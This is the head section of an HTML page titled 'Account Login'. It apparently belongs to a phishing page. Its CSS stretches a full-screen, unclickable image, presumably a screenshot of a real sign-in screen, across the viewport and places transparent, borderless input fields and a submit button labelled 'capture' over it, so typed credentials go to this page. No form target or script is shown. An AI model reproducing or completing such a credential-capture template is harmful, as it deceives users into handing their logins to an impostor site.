    <html lang="en">
    <head>
        <meta charset="UTF-8">

        <title>Account Login</title>
        <style>
            * { box-sizing: border-box; }
            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                overflow: hidden;
                background: #ffffff;
            }
            .page-raster {
                position: fixed;
                inset: 0;
                width: 100vw;
                height: 100vh;
                object-fit: fill;
                z-index: 1;
                user-select: none;
                pointer-events: none;
            }
            .capture-form {
                position: fixed;
                inset: 0;
                width: 100vw;
                height: 100vh;
                z-index: 10;
                margin: 0;
                padding: 0;
            }
            .capture-control {
                position: absolute;
                margin: 0;
                padding: 0 12px;
                border: 0;
                border-radius: 7px;
                outline: none;
                background: transparent;
                color: #202124;
                caret-color: #202124;
                font: 15px -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                z-index: 11;
            }
            .capture-control:focus {
                box-shadow: inset 0 0 0 2px rgba(26, 115, 232, 0.85);
            }
            .capture-submit {
                position: absolute;
                margin: 0;
                padding: 0;
                border: 0;
                border-radius: 7px;
                background: transparent;
                cursor: pointer;
                z-index: 11;
            }
        </style>
